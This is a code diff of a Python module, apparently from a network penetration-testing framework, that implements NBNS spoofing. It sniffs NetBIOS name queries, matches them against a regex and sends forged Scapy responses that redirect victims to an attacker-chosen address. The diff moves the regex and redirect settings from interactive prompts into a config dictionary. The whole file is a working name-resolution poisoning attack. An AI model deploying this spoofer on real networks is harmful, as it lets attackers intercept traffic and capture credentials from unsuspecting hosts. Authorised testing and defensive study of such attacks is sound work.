@@ -7,24 +7,29 @@ import config
 
 
 class nbns(Poison):
-    """ implements NBNS spoofing as seen in msf.
-        Requests are matched based on Python's regex parser.  Careful!
-
-    http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html
-    """
     def __init__(self):
+        super(nbns, self).__init__('NBNS Poison')
         conf.verb = 0
         self.local_mac = get_if_hwaddr(config.get('iface'))
-        self.regex_match = None
-        self.redirect = None
-        self.running = False
-        super(nbns, self).__init__('NBNS Poison')
+        self.config.update({"regex_match":{"type":"regex", 
+                                           "value":None,
+                                           "required":True, 
+                                           "display":"Match request regex"},
+                            "redirect":{"type":"ip", 
+                                        "value":None,
+                                        "required":True, 
+                                        "display":"Redirect to"}
+                           })
+        self.info = """
+                    Implements NBNS spoofing.
+                    Requests are matched based on Python's regex parser.
+                    """
 
     def handler(self, pkt):
         """Callback for packets"""
         if pkt.haslayer(NBNSQueryRequest):
             request = pkt[NBNSQueryRequest].getfieldval('QUESTION_NAME')
-            ret = self.regex_match.search(request.lower())
+            ret = self.config['regex_match']['value'].search(request.lower())
             if ret is None:
                 return
 
@@ -34,32 +39,16 @@ class nbns(Poison):
                 response = Ether(dst=pkt[Ether].src, src=self.local_mac)
                 response /= IP(dst=pkt[IP].src) / UDP(sport=137, dport=137)
                 response /= NBNSQueryResponse(NAME_TRN_ID=trans_id,
-                            RR_NAME=request, NB_ADDRESS=self.redirect)
+                  RR_NAME=request, NB_ADDRESS=self.config['redirect']['value'])
                 del response[UDP].chksum  # recalc checksum
                 sendp(response)    # layer 2 send for performance
                 self.log_msg('Spoofing \'%s\' from %s'
                                         % (request.strip(), pkt[IP].src))
 
     def initialize(self):
-        """Initialize spoofer"""
-        while True:
-            try:
-                util.Msg('Using interface [%s:%s]'
-                                    % (config.get('iface'), self.local_mac))
-                tmp = raw_input('[+] Match request regex: ')
-                self.regex_match = re.compile(tmp)
-                self.redirect = raw_input('[+] Redirect matched requests to: ')
-                tmp = raw_input('[!] Match requests with \'%s\' and redirect to \'%s\'.  Is this correct? '\
-                                        %(self.regex_match.pattern, self.redirect))
-                if 'n' in tmp.lower():
-                    return
-                break
-            except KeyboardInterrupt:
-                return False
-            except Exception:
-                pass
-
-        print '[!] Starting NBNS spoofer...'
+        """Initialize spoofer
+        """
+        util.Msg('[!] Starting NBNS spoofer...')
         sniffr = Thread(target=self.sniff_thread)
         sniffr.start()
         self.running = True
@@ -79,4 +68,5 @@ class nbns(Poison):
 
     def session_view(self):
         """Override session viewer"""
-        return '%s -> %s' % (self.regex_match.pattern, self.redirect)
+        return '%s -> %s' % (self.config['regex_match']['value'].pattern,
+                self.config['redirect']['value'])
